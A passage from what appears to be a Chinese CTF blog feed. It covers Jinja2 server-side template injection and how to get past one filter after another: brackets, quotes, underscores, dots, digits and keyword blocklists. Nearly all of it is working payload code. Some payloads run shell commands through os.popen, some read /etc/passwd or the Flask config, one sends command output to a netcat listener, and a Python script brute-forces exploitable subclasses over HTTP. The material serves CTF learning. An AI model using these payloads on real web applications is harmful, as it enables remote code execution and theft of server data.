class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%..%&#125;绕过,可以执行..中的python代码</span><br><span class=\"line\">直接&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br><span class=\"line\">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;whoami&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3没有回显盲注\"><a class=\"markdownIt-Anchor\" href=\"#3没有回显盲注\">#</a> 3. 没有回显，盲注</h3>\n<p>kali 终端:nc -lvp 100<br>\n![[Pasted image 20230418234630.png]]<br>\n 新 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls|nc 127.0.0.1 100&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4过滤了\"><a class=\"markdownIt-Anchor\" href=\"#4过滤了\">#</a> 4. 过滤了 []</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">去搜索了一番</span><br><span class=\"line\"></span><br><span class=\"line\">发现存在魔术方法可以不需要方括号来实现</span><br><span class=\"line\"></span><br><span class=\"line\">即__getitem__</span><br><span class=\"line\">eg.mydict[&#x27;name&#x27;]大致等同于mydict.__getitem__(&#x27;name&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">索引无法使用只好选择遍历来匹配</span><br><span class=\"line\"></span><br><span class=\"line\">遍历&#x27;&#x27;.__class__.__base__.__subclasses__()找到需要的模块</span><br><span class=\"line\"></span><br><span class=\"line\">再初始化后进行相关操作</span><br><span class=\"line\"></span><br><span class=\"line\">python逻辑如下</span><br><span class=\"line\"></span><br><span class=\"line\">for i in &#x27;&#x27;.__class__.__base__.__subclasses__():</span><br><span class=\"line\">    if i.__name__==&#x27;Popen&#x27;</span><br><span class=\"line\">    需要执行的内容</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>构造成 payload 就是:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p><mark>用__getitem__(‘os’) 代替 [‘os’]</mark></p>\n<p>还可以用 getitem 代替 127 继续用原始式子解出:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(127).__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5过滤了单引号和双引号\"><a class=\"markdownIt-Anchor\" href=\"#5过滤了单引号和双引号\">#</a> 5. 过滤了单引号和双引号</h3>\n<p>(1). 用 request 传参绕过<br>\n即可以用 request.values.args 来代替字符串</p>\n<p>原 payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>修改:<br>\n 用 hackbar</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code=&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?arg1=__builtins__&amp;arg2=__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()</span><br></pre></td></tr></table></figure>\n<p>(2).set chr 绕过</p>\n<p>&lt;class ‘warnings.catch_warnings’&gt; 中的 chr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag的chr:</span><br><span class=\"line\">chr(102)%2bchr(108)%2bchr(97)%2bchr(103)</span><br></pre></td></tr></table></figure>\n<h3 id=\"6限制了下划线\"><a class=\"markdownIt-Anchor\" href=\"#6限制了下划线\">#</a> 6. 限制了下划线</h3>\n<p>(1) request 传参绕过<br>\n (2) attr 函数加 reques 传参</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;</span><br><span class=\"line\">&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class=\"line\">&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(2)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post传参</span><br><span class=\"line\"></span><br><span class=\"line\">`code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">get传参</span><br><span class=\"line\"></span><br><span class=\"line\">`?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()`</span><br></pre></td></tr></table></figure>\n<h3 id=\"7过滤了\"><a class=\"markdownIt-Anchor\" href=\"#7过滤了\">#</a> 7. 过滤了.</h3>\n<p>(1) 用 [] 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][2][&#x27;__subclasses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>(2) 用 attr 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&quot;|attr(&quot;__class__)=&quot;&quot;.__class__</span><br><span class=\"line\">foo|attr(&quot;bar&quot;)=foo.bar</span><br><span class=\"line\"></span><br><span class=\"line\">1.&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(213)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(40)(&#x27;flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"8\"><a class=\"markdownIt-Anchor\" href=\"#8\">#</a> 8.</h3>\n<p>该题限制了一堆关键词<br>\n “class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”</p>\n<p>能想到的只有改编码或者拼接字符串<br>\n (1) 拼接字符串<br>\n该题只限制的是连续的字符串，并没有限制将零碎的字符串拼接成一整个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;&#x27;ass__&#x27;][&#x27;__mr&#x27;&#x27;o__&#x27;][2][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">也可以用+连接</span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__mr&#x27;+&#x27;o__&#x27;][2][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>join 拼接用法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;[1,2,3]|join&#125;&#125;==123 默认用空格串联,可选参数</span><br><span class=\"line\">&#123;&#123;[1,2,3]|join(&#x27;|&#x27;)&#125;&#125;==1|2|3</span><br><span class=\"line\">eg.</span><br><span class=\"line\">&#123;&#123;&quot;&quot;.class&#125;&#125;</span><br><span class=\"line\">==&#123;&#123;&quot;&quot;.[cla,ss]|join&#125;&#125;</span><br><span class=\"line\">==&#123;&#123;&quot;&quot;[&#x27;[cla,ss]|join&#x27;]&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__[cla,ss]|join]__&#x27;&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;&#x27;ass__&#x27;][&#x27;__mr&#x27;&#x27;o__&#x27;][2][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(2) 编码绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"9限制0-9\"><a class=\"markdownIt-Anchor\" href=\"#9限制0-9\">#</a> 9. 限制 0-9</h3>\n<p>用循环找到能利用的类直接用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>用 lipsum 不通过数字直接利用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>构造数字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code=&#123;%set one=dict(a=&#x27;a&#x27;)|join|count%&#125;&#123;%set two=dict(aa=&#x27;aa&#x27;)|join|count%&#125;&#123;%set three=dict(aaa=&#x27;aaa&#x27;)|join|count%&#125;&#123;% set eryisan=(two~one~three)|int %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[eryisan].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">&#123;%set one=dict(a=a)|join|count%&#125;</span><br><span class=\"line\">&#123;%set two=dict(aa=a)|join|count%&#125;</span><br><span class=\"line\">&#123;%set three=dict(aaa=a)|join|count%&#125;</span><br><span class=\"line\">&#123;% set eryisan=(two~one~three)|int %&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[eryisan].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"10\"><a class=\"markdownIt-Anchor\" href=\"#10\">#</a> 10.</h3>\n<p>该题的限制为  <code>set config = None</code> <br>\n 而且这题的 target 不是 flag 了</p>\n<p>而是 get config, 那就是要拿到 config 内容咯</p>\n<p>搜索一番后知道了可以用 current_app 拿到 config</p>\n<p>并且需要用到 url_for 方法</p>\n<p>payload 如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"11过滤了-request-和\"><a class=\"markdownIt-Anchor\" href=\"#11过滤了-request-和\">#</a> 11. 过滤了 <code>, &quot; + request . [和] </code></h3>\n<p>先确定一个利用的基本 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum|string|list&#125;&#125;</span><br><span class=\"line\">查看_在第几个,我这里是18</span><br><span class=\"line\">&#123;&#123;lipsum|string|list|attr(pop)(18)&#125;&#125;</span><br><span class=\"line\">这里的pop必须是字符串才能有用</span><br><span class=\"line\">set一个pop字符串:</span><br><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;  </span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">此时成功取到_,再用下划线去构造其他的类</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict=(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">再构造后面的方法</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;  </span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;  </span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;  </span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;  </span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;  </span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">完成语法:</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>合在一起:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"12这一关把数字和_也过滤了\"><a class=\"markdownIt-Anchor\" href=\"#12这一关把数字和_也过滤了\">#</a> 12. 这一关把数字和_也过滤了</h3>\n<p>可在上一关的基础上加数字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;</span><br><span class=\"line\">&#123;% set eighteen=nine+nine %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"13过滤的东西更多了但是我们上面的payload完美避开\"><a class=\"markdownIt-Anchor\" href=\"#13过滤的东西更多了但是我们上面的payload完美避开\">#</a> 13. 过滤的东西更多了，但是我们上面的 payload 完美避开</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/02/SSTI/",
            "url": "https://hq185187.github.io/2023/05/02/SSTI/",
            "title": "SSTI总结",
            "date_published": "2023-05-02T02:48:11.201Z",
            "content_html": "<p><mark>重点</mark></p>\n<h2 id=\"怎么查找并且使用shell类找名字和脚本代码\"><a class=\"markdownIt-Anchor\" href=\"#怎么查找并且使用shell类找名字和脚本代码\">#</a> 怎么查找并且使用 shell 类：找名字和脚本代码</h2>\n<h3 id=\"一最笨的方法\"><a class=\"markdownIt-Anchor\" href=\"#一最笨的方法\">#</a> 一。最笨的方法</h3>\n<p>把所有的子类复制进 notepad++, 替换，为 \\n, 查找常见名字来找可以利用类和对应的序号</p>\n<h4 id=\"文件读取\"><a class=\"markdownIt-Anchor\" href=\"#文件读取\">#</a> 文件读取</h4>\n<p><code>&lt;class '_frozen_importlib_external.FileLoader'&gt;</code> <br>\n 脚本:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&#x27;请输入URL链接: &#x27;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):  </span><br><span class=\"line\">data=&#123;<span class=\"string\">&quot;code&quot;</span>:<span class=\"string\">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;]&#125;&#125;&quot;</span>&#125;<span class=\"comment\">#这里的code要根据实际情况填写哦  </span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response=requests.post(url,data=data)  </span><br><span class=\"line\"><span class=\"comment\">#print(response.text)  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> response.status_code==<span class=\"number\">200</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;_frozen_importlib_external.FileLoader&#x27;</span> <span class=\"keyword\">in</span> response.text:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\"><span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p>注意这个类有 get_data 方法可以直接用，eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[122].get_data(0,&quot;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看内置函数和对象\"><a class=\"markdownIt-Anchor\" href=\"#查看内置函数和对象\">#</a> 查看内置函数和对象</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello dict_keys([&#x27;range&#x27;, &#x27;dict&#x27;, &#x27;lipsum&#x27;, &#x27;cycler&#x27;, &#x27;joiner&#x27;, &#x27;namespace&#x27;, &#x27;url_for&#x27;, &#x27;get_flashed_messages&#x27;, &#x27;config&#x27;, &#x27;request&#x27;, &#x27;session&#x27;, &#x27;g&#x27;])</span><br></pre></td></tr></table></figure>\n<h4 id=\"os类builtins类查找\"><a class=\"markdownIt-Anchor\" href=\"#os类builtins类查找\">#</a> <mark>os 类，builtins 类查找</mark></h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入链接: &quot;</span>)  